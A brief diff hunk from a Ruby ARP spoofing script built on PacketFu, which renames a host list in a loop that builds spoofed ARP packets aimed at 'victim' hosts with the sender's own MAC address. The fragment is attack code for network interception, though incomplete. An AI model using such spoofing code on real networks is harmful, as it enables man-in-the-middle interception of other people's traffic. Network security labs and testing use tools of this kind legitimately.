@@ -58,7 +58,7 @@ threads = []
 puts "Sending ARP Packet Spoof Every 30 Seconds…"
 
 while true
-  tools.arp_host.each do |host|
+  tools.arp_hosts.each do |host|
     # Build Ethernet header
     arp_packet_victim = PacketFu::ARPPacket.new
     arp_packet_victim.eth_saddr = tools.my_mac              # our MAC address
